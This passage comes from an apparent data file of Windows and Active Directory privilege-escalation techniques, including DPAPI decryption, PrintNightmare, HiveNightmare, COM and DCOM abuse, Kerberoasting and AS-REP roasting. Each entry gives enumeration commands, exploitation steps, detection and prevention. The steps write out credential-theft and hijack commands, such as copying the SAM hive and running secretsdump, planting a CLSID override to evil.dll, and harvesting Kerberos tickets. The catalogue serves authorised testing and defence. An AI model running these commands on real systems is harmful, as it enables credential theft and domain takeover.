      'unique, randomized local administrator passwords per machine via LAPS to limit the blast radius of any single extracted hash, and monitor for the ' +
      'specific reg save command pattern described above.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1003.002 (OS Credential Dumping: Security Account Manager)', description: 'SAM/SYSTEM hive extraction followed by pass-the-hash is one of the most ubiquitous post-exploitation and lateral-movement techniques in both red team methodology and real-world intrusions, forming a core part of nearly every Windows-focused engagement.' }
    ]
  },
  {
    id: 'windows-dpapi-abuse',
    name: 'DPAPI Abuse (Master Key and Credential Blob Decryption)',
    category: 'Credential Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'The Data Protection API (DPAPI) is the underlying mechanism Windows uses to encrypt sensitive user- and machine-scoped secrets, including ' +
      'Wi-Fi passwords, saved browser credentials (Chrome, Edge), Credential Manager entries, and RDP saved passwords. User-scoped DPAPI secrets are ' +
      'encrypted with a master key that is itself encrypted using a key derived from the user\'s logon password, meaning an attacker who has the ' +
      'user\'s plaintext password (or NTLM hash, or can access the user\'s active logon session) can decrypt any DPAPI-protected blob belonging to that ' +
      'user, including previously unrecoverable saved credentials. Machine-scoped DPAPI secrets are protected by a key derivable by any local ' +
      'administrator via the machine\'s DPAPI backup key stored under the SYSTEM registry hive, meaning administrative access alone is sufficient to ' +
      'decrypt machine-scoped secrets without needing any user\'s password at all.',
    enumeration_commands: [
      { command: 'dir /s /b %APPDATA%\\Microsoft\\Protect', description: 'Locate the user\'s DPAPI master key files, stored per-user under the roaming AppData profile.', what_to_look_for: 'Master key GUID-named files present and readable, confirming DPAPI secrets exist for this user.' },
      { command: 'dir /s /b %LOCALAPPDATA%\\Microsoft\\Credentials %APPDATA%\\Microsoft\\Credentials', description: 'Locate DPAPI-protected credential blob files.', what_to_look_for: 'Credential blob files present, which will require the corresponding master key to decrypt.' },
      { command: 'reg query HKLM\\SECURITY\\Policy\\Secrets  (requires SYSTEM)', description: 'Access the machine DPAPI backup key material for administrator-level decryption of machine-scoped secrets.', what_to_look_for: 'Successful access confirming SYSTEM-level privileges needed for the machine-key decryption path.' }
    ],
    exploitation_steps: [
      'Determine whether you have the target user\'s plaintext password, NTLM hash, or an active session in their security context (via token impersonation), or whether you instead have local administrator/SYSTEM access to leverage the machine DPAPI backup key.',
      'Locate the relevant master key files under %APPDATA%\\Microsoft\\Protect\\<UserSID>\\ and the credential/vault blob files under %LOCALAPPDATA%\\Microsoft\\Credentials and %APPDATA%\\Microsoft\\Credentials.',
      'If you have the user\'s password or hash, use Mimikatz\'s dpapi::masterkey module with /password or /hash to decrypt the master key file, then dpapi::cred to decrypt the target credential blob using the recovered master key.',
      'If instead you have SYSTEM/administrator access without the user\'s password, extract the machine\'s DPAPI backup key from the SYSTEM hive (Mimikatz lsadump::secrets or a dedicated DPAPI backup key extraction module) and use it to directly decrypt machine-scoped secrets without needing any user credential.',
      'Apply the same technique to decrypt saved browser credentials (Chrome/Edge store their encryption key itself DPAPI-protected) and Credential Manager/Vault entries, recovering plaintext usernames and passwords.',
      'Use any recovered plaintext credentials for direct authentication, lateral movement, or further privilege escalation.',
      'Document the exact DPAPI decryption path used (user master key versus machine backup key) since it reflects a different underlying access requirement.'
    ],
    tools: ['Mimikatz (dpapi:: module)', 'SharpDPAPI', 'DonPAPI', 'LaZagne'],
    detection:
      'File access auditing on the %APPDATA%\\Microsoft\\Protect and Credentials directories, combined with Sysmon process monitoring for Mimikatz-family ' +
      'tool signatures and command-line patterns invoking dpapi:: modules, provides detection coverage; monitoring for SYSTEM-level access to ' +
      'HKLM\\SECURITY (normally inaccessible even to administrators without special handling) is a strong signal of the machine-key extraction path.',
    prevention:
      'Enable Credential Guard to protect DPAPI-related secrets from even local administrator access where supported, avoid storing highly sensitive ' +
      'credentials in DPAPI-protected browser/OS stores on shared or high-risk systems, and enforce strong, regularly rotated user passwords since ' +
      'password strength directly determines the difficulty of the master-key decryption path.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1555.001 (Credentials from Password Stores: Keychain / DPAPI equivalents), T1003.005 (Cached Domain Credentials)', description: 'DPAPI-based credential recovery is a standard component of both red team credential-harvesting playbooks and real-world post-compromise activity, particularly for recovering browser-saved credentials which frequently contain reused or high-value passwords.' }
    ]
  },
  {
    id: 'windows-printnightmare',
    name: 'PrintNightmare (CVE-2021-34527 / CVE-2021-1675) Print Spooler RCE/LPE',
    category: 'Service Vulnerability',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'PrintNightmare refers to a pair of closely related vulnerabilities (CVE-2021-1675, initially rated as a lower-severity local privilege ' +
      'escalation, and CVE-2021-34527, later found to also allow remote code execution) in the Windows Print Spooler service\'s RpcAddPrinterDriver and ' +
      'related RPC functions. The Print Spooler service, which runs as SYSTEM and is enabled by default on virtually all Windows workstations and many ' +
      'servers (including, critically, many domain controllers), fails to properly validate that a caller adding a new printer driver has legitimate ' +
      'administrative rights to do so. A local, low-privileged user can call the vulnerable RPC function to install a malicious, attacker-supplied ' +
      'printer driver DLL, which the Spooler service then loads and executes in its own SYSTEM context -- granting immediate local privilege escalation. ' +
      'The same underlying flaw, when the Spooler\'s remote RPC interface is exposed, allows a remote unauthenticated-to-the-target (but domain- ' +
      'authenticated) attacker to achieve remote code execution as SYSTEM on any machine with the vulnerable Spooler service running and reachable, ' +
      'making it especially devastating against domain controllers.',
    enumeration_commands: [
      { command: 'Get-Service -Name Spooler', description: 'Check whether the Print Spooler service is present and running.', what_to_look_for: 'A Running status for the Spooler service.' },
      { command: 'wmic qfe list | findstr "KB5004945 KB5004946 KB5004947 KB5005010"', description: 'Check for the presence of the July 2021 and later security updates that addressed PrintNightmare.', what_to_look_for: 'Absence of the relevant patch KBs, indicating likely vulnerability.' },
      { command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Drivers /s | findstr "Level -1"', description: 'A supplementary check for point-and-print driver-installation restrictions that affect exploitability.', what_to_look_for: 'Restrictive Point and Print Restrictions Group Policy settings (or their absence) that determine whether the exploit path is fully open.' }
    ],
    exploitation_steps: [
      'Confirm the Print Spooler service is running and the target lacks the relevant July 2021+ security patches.',
      'For local privilege escalation, use a public PrintNightmare PoC (such as the widely referenced PowerShell/C# implementations released shortly after disclosure) that crafts a malicious printer driver package and calls RpcAddPrinterDriverEx (or the equivalent AddPrinterDriverEx Win32 API wrapper) to register it.',
      'Prepare a malicious DLL payload (a reverse shell, or one that creates a local administrator account) to be loaded as the "driver" by the Spooler service.',
      'Execute the PoC, which triggers the Spooler service (running as SYSTEM) to load and execute the malicious driver DLL, achieving SYSTEM-level code execution locally.',
      'For the remote variant (where reachable and permitted within engagement scope), use a public remote PrintNightmare exploit (such as the Python-based CVE-2021-34527 implementations built on Impacket) against a target\'s exposed spoolss RPC endpoint from an authenticated domain context.',
      'Catch the resulting SYSTEM-level reverse shell or confirm the created administrative account, then verify final privilege level.',
      'Given the severity and potential for service disruption, exercise particular care in production environments and confirm this technique is explicitly within the authorized scope before use.'
    ],
    tools: ['Public PrintNightmare PoC exploits (PowerShell/C#/Python variants)', 'Impacket', 'Metasploit (exploit/windows/local/cve_2021_1675_printnightmare)'],
    detection:
      'Sysmon Event ID 7 (image load) monitoring for new, unsigned driver DLLs loaded by spoolsv.exe, combined with Print Service operational event logs ' +
      '(Event ID 316, 808) that record driver installation attempts, provides strong detection coverage; Microsoft also published a dedicated detection ' +
      'guidance document at the time of disclosure.',
    prevention:
      'Apply the July 2021 and subsequent Microsoft security updates addressing PrintNightmare, disable the Print Spooler service entirely on servers ' +
      'and domain controllers that do not require printing functionality (a Microsoft-recommended mitigation), and enforce Point and Print Restrictions ' +
      'via Group Policy to require administrative approval for new driver installation.',
    real_world_examples: [
      { reference: 'CVE-2021-34527 / CVE-2021-1675 (PrintNightmare)', description: 'One of the most impactful Windows vulnerabilities of 2021, notable for affecting a service enabled by default on domain controllers, leading Microsoft to issue emergency out-of-band patches and many organizations to disable the Print Spooler service entirely as an immediate mitigation.' }
    ]
  },
  {
    id: 'windows-hivenightmare-serioussam',
    name: 'HiveNightmare / SeriousSAM (CVE-2021-36934)',
    category: 'File Permission Vulnerability',
    difficulty: 'Low',
    likelihood: 'Rare',
    description:
      'CVE-2021-36934, publicly nicknamed HiveNightmare or SeriousSAM, is a Windows misconfiguration (present in Windows 10 builds 1809 through ' +
      '21H1 before the August 2021 patch) in which the access control list on several critical registry hive backup files under ' +
      'C:\\Windows\\System32\\config\\ (including the SAM, SYSTEM, and SECURITY hive shadow copies, along with Volume Shadow Copy Service snapshots more ' +
      'broadly) was mistakenly left readable by the built-in Users group, rather than restricted to Administrators/SYSTEM as intended. Because these ' +
      'files are backed up and remain accessible via VSS shadow copies, any low-privileged local user could read the SAM hive shadow copy directly, ' +
      'extract local account password hashes offline, and in the presence of System Restore points, was frequently also able to read a SYSTEM hive ' +
      'shadow copy needed to decrypt those SAM hashes without any special privileges at all.',
    enumeration_commands: [
      { command: 'icacls C:\\Windows\\System32\\config\\SAM', description: 'Check the ACL on the live SAM hive (normally restricted regardless of the bug, since the bug specifically affects VSS shadow copies).', what_to_look_for: 'This mainly confirms the normal locked-down state; the actual vulnerable files are the VSS shadow copies, checked separately.' },
      { command: 'vssadmin list shadows', description: 'Enumerate existing Volume Shadow Copy Service snapshots, which is where the vulnerable, overly permissive hive backup copies reside.', what_to_look_for: 'Any existing shadow copy, confirming a target for the read-access exploit.' },
      { command: 'icacls "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"', description: 'Directly check the ACL of the SAM hive within a discovered shadow copy device path.', what_to_look_for: 'Read (RX) access granted to the BUILTIN\\Users group, confirming exploitability.' }
    ],
    exploitation_steps: [
      'Confirm the target Windows build is in the vulnerable range (Windows 10 1809 through 21H1 prior to the August 2021 patch) and that at least one Volume Shadow Copy exists (System Restore being enabled is a common trigger for VSS snapshot creation).',
      'Use a public HiveNightmare/SeriousSAM PoC tool, which automates creating a new shadow copy if none exists (using vssadmin or the equivalent Win32 API, which does not itself require elevated privileges to trigger under default configuration) and then copies the SAM, SYSTEM, and SECURITY hive files out of the shadow copy path.',
      'Alternatively, manually access the vulnerable files directly via the device path syntax: copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM" C:\\temp\\sam.hive (adjusting the shadow copy number as enumerated by vssadmin list shadows).',
      'Copy the corresponding SYSTEM hive from the same shadow copy path to obtain the decryption key material needed to process the SAM hashes.',
      'Extract local account NTLM hashes offline using Impacket\'s secretsdump.py: secretsdump.py -sam sam.hive -system system.hive LOCAL.',
      'Use the extracted local Administrator hash for pass-the-hash authentication, or crack it offline if a weak password was in use, to complete privilege escalation.',
      'Verify final access level and document that HiveNightmare/CVE-2021-36934 was the exploited vulnerability class.'
    ],
    tools: ['Public HiveNightmare/SeriousSAM PoC scripts', 'vssadmin.exe', 'Impacket secretsdump.py', 'icacls'],
    detection:
      'Monitoring for vssadmin.exe or equivalent shadow-copy-creation API calls from non-administrative, non-backup-software processes, combined with ' +
      'file access auditing on shadow copy device paths targeting the config directory, are the primary detection controls.',
    prevention:
      'Apply the August 2021 Windows security update addressing CVE-2021-36934, and as an interim mitigation, restrict access to the System Volume ' +
      'Information directory and audit/repair the ACLs on any existing shadow copy hive backups using the Microsoft-published remediation script.',
    real_world_examples: [
      { reference: 'CVE-2021-36934 (HiveNightmare / SeriousSAM)', description: 'Discovered and publicized in mid-2021, this vulnerability was notable for requiring zero exploitation sophistication once the ACL misconfiguration was understood -- any standard user with command-line access could extract local password hashes using only built-in Windows tools (vssadmin, copy) with no custom exploit code required.' }
    ]
  },
  {
    id: 'windows-named-pipe-impersonation',
    name: 'Named Pipe Impersonation',
    category: 'Token/Privilege Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Named pipes are a Windows inter-process communication mechanism, and a process that creates a named pipe server can call ' +
      'ImpersonateNamedPipeClient once a client connects, obtaining an impersonation-level token representing the connecting client\'s security ' +
      'context for the duration of that impersonation. This is the exact underlying primitive that the Potato exploit family and PrintSpoofer both ' +
      'ultimately rely on, but it can also be abused more directly: if an attacker can create a named pipe with a predictable or guessable name at a ' +
      'location a privileged process or service is expected to connect to (or can race a legitimate pipe\'s creation), and can then coerce or wait for ' +
      'that privileged process to connect to it, the attacker\'s pipe-server process can impersonate the connecting privileged client\'s token, ' +
      'provided the calling process holds SeImpersonatePrivilege (as most service-context processes do) to actually make use of the captured token.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Confirm SeImpersonatePrivilege is available to actually leverage a captured named pipe client token.', what_to_look_for: 'SeImpersonatePrivilege listed.' },
      { command: 'Get-ChildItem \\\\.\\pipe\\', description: 'Enumerate currently active named pipes on the system to identify naming patterns used by privileged services.', what_to_look_for: 'Pipe names associated with privileged services that might be recreated or raced by an attacker.' }
    ],
    exploitation_steps: [
      'Confirm SeImpersonatePrivilege is present in the current context (typically already true for a service-account foothold).',
      'Identify a privileged service or scheduled process that connects to a named pipe as a client (rather than a server), either by reverse-engineering the target application or observing its behavior with Process Monitor filtered on named pipe operations.',
      'Create a named pipe server with the exact expected name using CreateNamedPipe, before the legitimate server does (a timing race), or by identifying a genuinely attacker-controllable pipe name in the target\'s logic.',
      'Trigger or wait for the privileged process to connect to your pipe as a client (this may require coercing the service to restart, or exploiting an existing behavior that causes it to open the pipe).',
      'Once the privileged client connects, call ImpersonateNamedPipeClient from your pipe-server process to capture its token, then DuplicateTokenEx and CreateProcessWithTokenW (or CreateProcessAsUser) to spawn a new process running as the impersonated (privileged) identity.',
      'Confirm the spawned process runs with the target\'s elevated privileges, typically SYSTEM, and obtain a stable session.',
      'Note that in practice this raw technique is most often already automated by tools like the Potato family and PrintSpoofer, which implement specific, reliable pipe-race scenarios against known Windows RPC/Spooler behaviors rather than requiring a fully custom implementation.'
    ],
    tools: ['PrintSpoofer', 'GodPotato', 'Custom named-pipe impersonation PoC code (C/C++/C#)', 'Process Monitor'],
    detection:
      'Sysmon Event ID 17/18 (named pipe created/connected) monitoring, especially for pipe names associated with sensitive services being created by ' +
      'unexpected processes, combined with Event ID 4673/4674 privilege-use auditing for SeImpersonatePrivilege, provides detection coverage.',
    prevention:
      'Remove SeImpersonatePrivilege from service accounts that do not require it, keep Windows patched against the specific service-level bugs that ' +
      'enable reliable pipe-connection coercion (such as the Spooler and RPCSS issues underlying the Potato family), and deploy EDR with behavioral ' +
      'detection for named pipe impersonation patterns.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1134.001 (Token Impersonation/Theft)', description: 'Named pipe impersonation is the foundational primitive documented under MITRE ATT&CK\'s token manipulation technique, and underlies essentially every Potato-family and PrintSpoofer-style SYSTEM escalation observed in real engagements.' }
    ]
  },
  {
    id: 'windows-com-object-hijacking',
    name: 'COM Object Hijacking',
    category: 'Registry / Component Object Model Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'The Component Object Model (COM) resolves a requested class (identified by a CLSID) to an actual DLL or executable by looking up registry ' +
      'entries under HKEY_CLASSES_ROOT\\CLSID\\{CLSID}\\InprocServer32 (for in-process DLLs) or LocalServer32 (for out-of-process executables). Critically, ' +
      'HKEY_CLASSES_ROOT is a merged view that checks the current user\'s HKCU\\Software\\Classes hive before falling back to the machine-wide ' +
      'HKLM\\Software\\Classes hive, and HKCU is always writable by the standard user without any special privilege. If a privileged process (a service, ' +
      'a scheduled task, or an application launched by an administrator) instantiates a COM object by CLSID and no corresponding HKCU override exists ' +
      'for the current low-privileged user context, an attacker can create one, redirecting the CLSID lookup to a malicious DLL or executable of their ' +
      'choosing. When the privileged process next instantiates that COM object, it loads and executes the attacker\'s code with its own elevated ' +
      'privileges. This is the same underlying registry-hijack primitive several UAC bypasses (fodhelper, sdclt) rely on, generalized to any COM- ' +
      'consuming privileged process, not just the specific auto-elevating binaries.',
    enumeration_commands: [
      { command: 'reg query HKCR\\CLSID /s | findstr /i "InprocServer32"', description: 'Enumerate existing CLSID-to-DLL mappings to understand normal COM resolution and identify candidate CLSIDs used by privileged scheduled tasks/services.', what_to_look_for: 'CLSIDs referenced by known privileged scheduled tasks (correlated via task XML inspection) that lack an existing HKCU override.' },
      { command: 'Procmon.exe filtered on RegOpenKey for HKCU\\Software\\Classes\\CLSID', description: 'Observe a privileged process\'s actual COM resolution behavior in real time to confirm it checks HKCU before HKLM and to identify the exact CLSID being resolved.', what_to_look_for: 'A NAME NOT FOUND result on the HKCU path followed by a successful HKLM lookup, confirming the HKCU override is currently absent and hijackable.' }
    ],
    exploitation_steps: [
      'Identify a privileged scheduled task, service, or application that instantiates a COM object by CLSID, using Procmon to observe its registry lookup pattern.',
      'Confirm no existing HKCU\\Software\\Classes\\CLSID\\{target-CLSID}\\InprocServer32 override is present for the current user context.',
      'Write a malicious DLL (or reuse the pattern from a UAC bypass exploit if targeting an auto-elevating binary) that performs your desired payload action in DllMain or an appropriate exported COM interface function.',
      'Create the HKCU registry override: reg add "HKCU\\Software\\Classes\\CLSID\\{target-CLSID}\\InprocServer32" /d "C:\\Users\\Public\\evil.dll" /f.',
      'Trigger the privileged process to instantiate the COM object (wait for the scheduled task/service trigger, or invoke the application as applicable).',
      'Confirm your malicious DLL was loaded and executed with the target process\'s elevated privileges.',
      'Verify final privilege level with whoami /priv and clean up the created registry key after demonstrating impact if required.'
    ],
    tools: ['Process Monitor (Procmon)', 'reg.exe', 'PowerUp', 'UACME (for related auto-elevate CLSID hijacks)'],
    detection:
      'Sysmon Event ID 13 (registry value set) monitoring on HKCU\\Software\\Classes\\CLSID paths combined with Event ID 7 (image load) correlation for ' +
      'subsequently loaded DLLs from user-writable paths provides strong detection coverage for this technique.',
    prevention:
      'Avoid designing privileged services/tasks to instantiate COM objects using CLSIDs that can be overridden per-user without additional integrity ' +
      'checks, and monitor for HKCU Classes\\CLSID modifications as part of routine endpoint detection coverage.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1546.015 (Component Object Model Hijacking)', description: 'COM hijacking is documented as both a persistence and privilege escalation technique in MITRE ATT&CK, and forms the underlying mechanism for several well-known UAC bypass techniques as well as more general privileged-process code execution.' }
    ]
  },
  {
    id: 'windows-dcom-exploitation',
    name: 'DCOM Exploitation for Lateral Movement and Local Execution',
    category: 'Registry / Component Object Model Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'Distributed COM (DCOM) extends COM across the network, allowing a remote or local caller with appropriate permissions to instantiate and invoke ' +
      'methods on COM objects hosted by another process, frequently one running with elevated privileges. Several built-in Windows COM objects expose ' +
      'methods that were never intended as attack surface but that can be abused for code execution once a caller can instantiate them: the classic ' +
      'example is the MMC20.Application object\'s ExecuteShellCommand method, and the ShellWindows/ShellBrowserWindow objects\' Document.Application.' +
      'ShellExecute method, both of which let an authorized caller (anyone able to instantiate the object, gated by DCOM launch/activation permissions ' +
      'rather than a specific privilege check on the method itself) run an arbitrary command in the context of the user who owns the session hosting ' +
      'the object. When targeting a session belonging to a more privileged user (for local privesc, typically by finding a DCOM object instantiable in ' +
      'that user\'s existing session context) or when used for lateral movement to a system where a privileged user is logged on, this achieves code ' +
      'execution under that identity without needing any exploit at all -- only the DCOM permission and launch/activation rights.',
    enumeration_commands: [
      { command: 'Get-CimInstance Win32_DCOMApplication', description: 'Enumerate registered DCOM applications on the local system.', what_to_look_for: 'Well-known abusable AppIDs/CLSIDs such as MMC Application Class (MMC20.Application) or Shell Windows.' },
      { command: '[System.Runtime.InteropServices.Marshal]::GetActiveObject("MMC20.Application")', description: 'From a PowerShell session, attempt to bind to an already-running MMC20.Application COM object in another user\'s session.', what_to_look_for: 'Successful binding indicating the target object is instantiable and can be driven programmatically.' },
      { command: 'dcomcnfg.exe (GUI) or Get-DcomAppLaunchAccountPermission (custom scripts)', description: 'Review DCOM launch and activation permissions for a target AppID to determine which accounts are authorized to instantiate it remotely or locally.', what_to_look_for: 'Overly permissive launch/activation ACLs granting rights to a broad group such as Everyone or Authenticated Users.' }
    ],
    exploitation_steps: [
      'Identify a target DCOM object known to expose a code-execution primitive, such as MMC20.Application (ExecuteShellCommand) or ShellWindows (Document.Application.ShellExecute).',
      'For local privilege escalation, determine whether a more privileged user has an active session in which the target COM object is already running or instantiable, and whether your current context has the necessary DCOM launch/activation permission.',
      'Instantiate the object via its ProgID or CLSID from a scripting context (PowerShell\'s [Activator]::CreateInstance, or a .NET/C# equivalent), e.g. $obj = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application")).',
      'Invoke the exposed method to run an arbitrary command: $obj.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c YOUR_PAYLOAD", "7") for MMC20.Application, or the equivalent ShellExecute call for ShellWindows.',
      'The invoked command executes in the security context of the user who owns the target session, achieving code execution as that (potentially more privileged) identity.',
      'Catch the resulting reverse shell or confirm the payload\'s effect, then verify the final privilege level obtained.',
      'For remote/lateral movement use cases within scope, the same technique applies against a remote host\'s DCOM interface, provided network access and DCOM permissions allow it, achieving code execution on that remote system under the target session\'s identity.'
    ],
    tools: ['PowerShell ([Activator]::CreateInstance)', 'Cobalt Strike DCOM lateral movement modules', 'Impacket dcomexec.py', 'dcomcnfg.exe'],
    detection:
      'Sysmon Event ID 1 (process creation) monitoring for cmd.exe or powershell.exe spawned as a child of mmc.exe or explorer.exe with an unusual ' +
      'command line, combined with DCOM/RPC connection logging (Event ID 5712 or network-level RPC monitoring for lateral movement scenarios), reveals ' +
      'this technique.',
    prevention:
      'Restrict DCOM launch and activation permissions to only the specific accounts and systems that require them via dcomcnfg.exe, disable or ' +
      'restrict remote DCOM activation where not needed, and monitor for the specific process-lineage patterns associated with known abusable DCOM ' +
      'objects.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1021.003 (Remote Services: Distributed Component Object Model)', description: 'DCOM-based lateral movement and local code execution via MMC20.Application and ShellWindows was popularized by security researcher Matt Nelson (enigma0x3) and remains a documented, low-noise technique in MITRE ATT&CK and red team tradecraft.' }
    ]
  },
  {
    id: 'windows-kerberoasting',
    name: 'Kerberoasting (Service Account Ticket Cracking for Domain Privilege Escalation)',
    category: 'Active Directory Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Kerberoasting targets Active Directory service accounts that have a Service Principal Name (SPN) registered, most commonly accounts used to run ' +
      'SQL Server, IIS application pools, or custom application services with domain privileges. Any authenticated domain user (even a completely ' +
      'unprivileged one) can request a Kerberos service ticket (TGS) for any SPN-registered account directly from the domain controller, and that ' +
      'ticket\'s encrypted portion is protected using a key derived from the service account\'s own password hash (RC4 by default in many environments ' +
      'unless AES-only Kerberos is enforced). Because any domain user can request this ticket without triggering an authentication failure or needing ' +
      'the service account\'s password, an attacker can harvest TGS tickets for every SPN-registered account in the domain and crack them completely ' +
      'offline, with no further interaction with the domain controller and no lockout risk. Because service accounts are frequently configured with ' +
      'weak, old, or never-rotated passwords (and are sometimes members of Domain Admins for legacy application reasons), successfully cracking even ' +
      'one Kerberoastable account\'s ticket often yields a direct path to full domain compromise.',
    enumeration_commands: [
      { command: 'setspn -T DOMAIN -Q */*', description: 'Enumerate all SPN-registered accounts in the domain using the built-in setspn utility.', what_to_look_for: 'Non-computer accounts (user accounts) with an SPN, which are Kerberoastable and typically use weaker, human-managed passwords compared to computer accounts.' },
      { command: 'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName', description: 'PowerShell/ActiveDirectory module equivalent for enumerating SPN-registered user accounts.', what_to_look_for: 'Accounts additionally flagged with high-privilege group membership (Domain Admins, Enterprise Admins) via a follow-up Get-ADGroupMember check.' },
      { command: 'Rubeus.exe kerberoast /stats', description: 'Use Rubeus to enumerate Kerberoastable accounts and display statistics on ticket encryption types present (RC4 vs AES), informing crack difficulty estimates.', what_to_look_for: 'Accounts using RC4 (etype 23), which crack substantially faster than AES-protected tickets.' }
    ],
    exploitation_steps: [
      'From any authenticated domain user context (even a freshly compromised low-privileged account), enumerate SPN-registered accounts using setspn, PowerView\'s Get-DomainUser -SPN, or the AD PowerShell module.',
      'Request TGS tickets for each discovered SPN using Rubeus (Rubeus.exe kerberoast /outfile:hashes.txt) or Impacket\'s GetUserSPNs.py (GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request), both of which automate the enumeration-plus-ticket-request workflow in a single command.',
      'Export the harvested ticket hashes in Hashcat-crackable format (mode 13100 for Kerberos 5 TGS-REP etype 23, or mode 19600/19700 for AES variants).',
      'Run an offline dictionary and rule-based cracking attack against the harvested hashes using hashcat with a strong wordlist (e.g. rockyou.txt combined with best64.rule or a similar mangling ruleset), since offline cracking carries no domain lockout risk.',
      'For any successfully cracked account, determine its group memberships and effective permissions using Get-ADUser/Get-ADPrincipalGroupMembership or BloodHound.',
      'If the cracked account has direct or path-based (via BloodHound-identified ACL abuse) rights to Domain Admins or another highly privileged group, authenticate as that account and use its privileges to complete domain compromise.',
      'If the account is not immediately privileged, use it as a pivot point for further enumeration and lateral movement within the domain.'
    ],
    tools: ['Rubeus', 'Impacket GetUserSPNs.py', 'PowerView (Get-DomainUser -SPN)', 'hashcat', 'John the Ripper', 'BloodHound'],
    detection:
      'Windows Security Event Log Event ID 4769 (Kerberos service ticket requested) with an RC4 encryption type (0x17) requested for a large number of ' +
      'distinct SPNs from a single account in a short time window is the canonical Kerberoasting detection signature; SIEM correlation rules built ' +
      'around this pattern (and around unusual ticket-encryption-type requests generally) are standard in mature AD security monitoring.',
    prevention:
      'Enforce long (25+ character), randomly generated passwords for all service accounts, use Group Managed Service Accounts (gMSA) which have ' +
      'automatically rotated, cryptographically strong passwords, disable RC4 Kerberos encryption domain-wide in favor of AES-only where compatible, ' +
      'and minimize service account privilege (never place a service account directly in Domain Admins).',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)', description: 'Kerberoasting is one of the single most common and highest-impact Active Directory attack techniques observed in real-world penetration tests and actual breaches, popularized publicly by Tim Medin in 2014 and remaining a top finding due to persistently weak service account password practices across enterprises.' }
    ]
  },
  {
    id: 'windows-asrep-roasting',
    name: 'AS-REP Roasting',
    category: 'Active Directory Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'AS-REP Roasting targets domain accounts that have the "Do not require Kerberos preauthentication" option enabled (the UF_DONT_REQUIRE_ ' +
      'PREAUTH userAccountControl flag). Kerberos preauthentication normally requires a client to encrypt a timestamp with a key derived from their own ' +
      'password and send it to the domain controller before receiving a session ticket, preventing an attacker from requesting ticket material for an ' +
      'arbitrary account without already knowing something about its password. When preauthentication is disabled for an account, however, anyone can ' +
      'request an AS-REP (Authentication Server Reply) for that account\'s username with no proof of knowledge of its password at all, and the returned ' +
      'AS-REP contains a portion encrypted with a key derived from that account\'s password hash. This can be extracted and cracked completely offline, ' +
      'identical in spirit to Kerberoasting but requiring no valid domain credentials whatsoever to initiate -- only a list of usernames, making it ' +
      'exploitable even from a fully unauthenticated network position in many configurations.',
    enumeration_commands: [
      { command: 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth', description: 'From an authenticated domain context, enumerate accounts with Kerberos preauthentication disabled.', what_to_look_for: 'Any user account (not computer account) returned by this filter, especially ones with privileged group membership.' },
      { command: 'GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP', description: 'From an unauthenticated or minimally authenticated position, use Impacket to test a supplied list of candidate usernames against the domain for AS-REP roastability, with no valid password required.', what_to_look_for: 'Successfully retrieved AS-REP hashes for any tested username, confirming preauthentication is disabled for that account.' }
    ],
    exploitation_steps: [
      'Compile or enumerate a list of candidate domain usernames (via prior enumeration such as RID cycling, LDAP anonymous bind if permitted, OSINT, or a previously authenticated context) if you do not already have full authenticated visibility into the domain.',
      'Run Impacket\'s GetNPUsers.py against the domain controller with the -no-pass flag to test each username for AS-REP roastability without needing any credentials.',
      'For any successfully identified account, GetNPUsers.py automatically outputs the AS-REP hash in Hashcat-crackable format (mode 18200).',
      'If you already have authenticated domain access, alternatively use PowerView\'s Get-DomainUser -PreauthNotRequired or Rubeus\'s asreproast module for the same enumeration-plus-harvest workflow.',
      'Run an offline dictionary and rule-based cracking attack against the harvested AS-REP hashes using hashcat mode 18200, again with no domain lockout risk since cracking is entirely offline.',
      'For any successfully cracked account, determine its privilege level and group memberships, and use the recovered password directly to authenticate if it grants meaningful access.',
      'Chain the resulting access with further enumeration (BloodHound path analysis, Kerberoasting from this new authenticated context) toward full domain compromise if the initial account is not itself highly privileged.'
    ],
    tools: ['Impacket GetNPUsers.py', 'Rubeus (asreproast module)', 'PowerView', 'hashcat', 'John the Ripper'],
    detection:
      'Windows Security Event Log Event ID 4768 (Kerberos authentication ticket requested) where the PreAuthType field indicates no preauthentication ' +
      'was used, correlated against a baseline of accounts expected to have this configuration, is the primary detection signature; a surge of 4768 ' +
      'events for many distinct usernames from a single source in a short window is a strong indicator of a AS-REP roasting sweep.',
    prevention:
      'Ensure "Do not require Kerberos preauthentication" is disabled for all accounts unless there is a specific, documented legacy compatibility ' +
      'requirement, enforce strong password policies for any account that must retain this setting, and periodically audit the domain for accounts ' +
      'with this flag set using PowerShell or a dedicated AD security assessment tool.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)', description: 'AS-REP roasting is a standard component of nearly every Active Directory penetration test and internal assessment methodology, and is notable for being one of the few meaningful AD attacks that can sometimes be executed without any valid domain credentials at all.' }
    ]
  },
  {
    id: 'windows-dnsadmins-to-domainadmin',
    name: 'DnsAdmins Group to Domain Admin Escalation',
    category: 'Active Directory Abuse',
    difficulty: 'Medium',
